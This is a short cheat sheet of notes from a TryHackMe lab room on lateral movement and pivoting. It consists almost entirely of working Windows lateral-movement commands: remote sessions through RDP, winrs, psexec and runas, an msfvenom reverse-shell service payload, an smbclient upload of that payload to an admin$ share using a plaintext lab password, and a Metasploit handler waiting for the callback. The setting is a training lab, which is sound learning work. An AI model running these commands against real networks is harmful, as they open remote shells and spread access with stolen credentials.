# Reference
- https://tryhackme.com/r/room/lateralmovementandpivoting

# Notes 

# Commands 
~~~
xfreerdp /u:<uname>  /p:<pwd> /v:<ip>
~~~


~~~
$username = '<uname>';
$password = <pwd>';
$securePassword = ConvertTo-SecureString $password -AsPlainText -Force; 
$credential = New-Object System.Management.Automation.PSCredential $username, $securePassword;
~~~


~~~
winrs.exe -u:<uname> -p:<pwd> -r:target cmd
~~~

~~~
psexec64.exe \\<MACHINE_IP> -u <uname> -p <pwd> -i cmd.exe
~~~

~~~
msfvenom -p windows/shell/reverse_tcp -f exe-service LHOST=<ipaddress> LPORT=4444 -o <file>
~~~

~~~
smbclient -c 'put blitz.exe' -U t1_leonard.summers -W ZA '//thmiis.za.tryhackme.com/admin$/' EZpass4ever
~~~


~~~
msfconsole -q -x "use exploit/multi/handler; set payload windows/shell/reverse_tcp; set LHOST <netadapter>; set LPORT 4444; 
~~~


~~~
runas /netonly /user:<domain>\<user> cmd.exe
~~~